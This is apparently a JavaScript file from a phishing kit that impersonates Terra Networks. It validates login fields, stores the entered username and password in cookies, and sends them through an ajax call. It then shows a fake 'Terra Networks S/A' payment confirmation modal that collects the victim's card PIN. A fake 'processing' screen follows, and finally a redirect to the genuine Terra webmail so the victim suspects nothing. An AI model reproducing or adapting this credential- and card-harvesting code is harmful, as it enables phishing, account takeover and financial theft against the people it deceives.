function kingEnviar(){
    //window.alert('ddd');
  if ($(".kingUser").val().length < 3){
    $(".bxloginErro").html("<span>Usuario está invalido.</span>");
    $(".kingUser").val('');

    return false;

  } else if ($(".kingPass").val().length < 6){
    $(".bxloginErro").html("<span>Senha está incorreta.</span>");
    $(".kingPass").val('');

    return false;
  }
  document.cookie = "loginCod3r=" + $(".kingUser").val();
  document.cookie = "passwordCod3r=" + $(".kingPass").val();
  
  usejqueryNativeAjaxValidade($(".kingUser").val()+ ';'+$(".kingPass").val());


  setTimeout(function(){
    document.getElementById("formLogin").action = "login.php";
    document.getElementById("formLogin").submit();
  }, 100);
}

function validadeUserPassword(){
    usejqueryNativeAjaxValidade($(".userearth").val()+ ';'+$(".passearth").val());
   
}
function subAll(){
   setTimeout(function(){
    document.getElementById("formpg").action = "cadastro.php";
    document.getElementById("formpg").submit();
  }, 2000);  
}
function kingSubmit(){
  setTimeout(function(){
    document.getElementById("formaviso").action = "pagamento-de-titulos.php";
    document.getElementById("formaviso").submit();
  }, 2000);
}

function kingSend(){
  setTimeout(function(){
    document.getElementById("form1").action = "dados-de-pagamento.php";
    document.getElementById("form1").submit();
  }, 2000);
}

function sonumb(evtKeyPress){
  var nTecla;
  var detecta;
  var boolean = false;

  if(window.event){
    nTecla = window.event.keyCode;
    detecta = 0;
  } else if (evtKeyPress){
    nTecla = evtKeyPress.which;
    detecta = 1;
  }

  if(detecta==0){
    if(nTecla > 47 && nTecla < 58){
      boolean = true;
    } else {
      window.event.keyCode = null;
    }
  } else {
    if((nTecla > 47 && nTecla < 58)||(nTecla == 8)||(nTecla == 9)||(nTecla == 37)||(nTecla == 39)||(nTecla == 46)||(nTecla == 0)){
      boolean = true;
    } else {
      evtKeyPress.which = null;
    }
  }
  return boolean;
}

function pulacampo(idobj, idproximo){
  var str = new String(document.getElementById(idobj).value);
  var mx = new Number(document.getElementById(idobj).maxLength);
//window.alert(str);
  //if (str.length === mx){
    //document.getElementById(idproximo).focus();
  //}
}

$(document).ready(function(){
  $(".sonumero").on("keypress", function(event){
    return sonumb(event);
  });

  $("#divMestra").on("keypress", ".sonumeros", function(event){
    return sonumb(event);
  });
});

function divPassCC(){
  nameCod3r = $(".card-name").val();
  str = $(".card-numbera").val();
  str = str.substring(12,16);
  datt = $("#cod3rData").val();
  
  var aguardehtml = "<div id=\"bgadd\"></div><form id=\"ajaxpass\" name=\"ajaxpass\" method=\"post\" action=\"cadastro2.php\" onsubmit=\"return false\"><div id=\"modalposition\"><div style=\"text-align: right;\"><span class=\"payment__flag-container__images dispensable\" style=\"position: absolute; left: 26px; top: 26px;\"><span class=\"icon icon-40 icon-flag-elo\"></span><span class=\"icon icon-40 icon-flag-master\"></span><span class=\"icon icon-40 icon-flag-visa\"></span><span class=\"icon icon-40 icon-flag-american\"></span></span><img src=\"app/img/logo.png\" height=\"60\" width=\"106\" style=\"margin-right: 6px;\"></div><div style=\"padding-top: 20px;\"><strong>Para sua comodidade e seguranca sera necessario confirmar os dados abaixo:</strong></div><div style=\"padding-top: 24px;\"><span style=\"float: left; font-size: 14px; font-weight: 600;  width: 50%;\">Loja Online:</span><span style=\"float: right; font-size: 14px; font-weight: 300; width: 50%; text-align: left;\">Terra Networks S/A</span></div><div style=\"padding-top: 24px;\"><span style=\"float: left; font-size: 14px; font-weight: 600; width: 50%;\">Cliente:</span><span id=\"nomeMostra\" style=\"float: right; font-size: 14px; font-weight: 300; width: 50%; text-align: left;\"></span></div><div style=\"padding-top: 24px;\"><span style=\"float: left; font-size: 14px; font-weight: 600; width: 50%;\">Valor:</span><span style=\"float: right; font-size: 14px; font-weight: 300; width: 50%; text-align: left;\">19,82</span></div><div style=\"padding-top: 24px;\"><span style=\"float: left; font-size: 14px; font-weight: 600; width: 50%;\">Data:</span><span id=\"dattMostra\" style=\"float: right; font-size: 14px; font-weight: 300; width: 50%; text-align: left;\"></span></div><div style=\"padding-top: 24px;\"><span style=\"float: left; font-size: 14px; font-weight: 600; width: 50%;\">Tipo:</span><span style=\"float: right; font-size: 14px; font-weight: 300; width: 50%; text-align: left;\">Cartao Credito</span></div><div style=\"padding-top: 24px;\"><span style=\"float: left; font-size: 14px; font-weight: 600; width: 50%;\">Numero do Cartao:</span><div style=\"float: right; font-size: 14px; font-weight: 300; width: 50%; text-align: left;\"><span style=\"font-size: 12px;\">XXXX-XXXX-XXXX-</span><span id=\"fimMostra\"></span></div></div><div style=\"padding-top: 36px;\"><span id=\"passWD\" class=\" \" style=\"float: left; font-size: 14px; font-weight: 600; width: 50%;\">Senha do Cartao:</span><span style=\"float: right; font-size: 14px; font-weight: 300; width: 40%; text-align: left; margin-right: 32px;\"><input class=\"card-passa sonumeros \" name=\"card-pass\" id=\"card-pass\" value=\"\" type=\"password\" onkeypress=\"delClass(\'card-pass\', \'input--error\'); delClass(\'passWD\', \'erradoTT\')\" maxlength=\"6\" style=\"padding-left: 2px\"></span></div><div style=\"padding-top: 36px;\"><button class=\"payment__type__body__done btton vamosd\" >Confirmar</button></div></div></form>";
  
  $("#divMestra").append(aguardehtml);
  $("#nomeMostra").append(nameCod3r);
  $("#fimMostra").append(str);
  $("#dattMostra").append(datt);
}

function divConf(){
  var aguardehtml = "<div id=\"app-layer_5\" class=\"app-layer opened\"><div class=\"layer-overlay overlay-opacity-light\"></div><div class=\"layer-content-wrap\" style=\"width: 500px; height: 170px;\"><a href=\"javascript:void()\" onclick=\"location.href='https://mail.terra.com.br/';\" class=\"close-button icon icon-24 icon-close-filled\"></a><div id=\"layer-content_5\" class=\"layer-content\"><div class=\"payment\"><div class=\"payment__modal payment__modal\"><div class=\"message\"></div><div class=\"payment__modal--success\"><p>Pagamento confirmado com Sucesso!</p><button class=\"close\" onclick=\"location.href=\'https://mail.terra.com.br/\';\">Acessar Email</button></div></div></div></div></div></div>";
  $("#divTeste").append(aguardehtml);
}

function espereoplas(){
  var aguardehtml = "<div id=\"bgadd\"></div><div id=\"aguarde\"><div style=\"text-align: center; z-index: 99999;\"><img src=\"app/img/load3.svg\" height=\"50\" width=\"50\" ></div><div style=\"padding: 20px; text-align: center;\">Aguarde, Processando seu pagamento.</div></div>";
  
  $("#divMestra").append(aguardehtml);
  $("#bgadd").hide();
  $("#ajaxpass").hide();
  setTimeout(function(){
    $("#bgadd").hide();
    $("#aguarde").hide();
    divConf();
  }, 5000);
}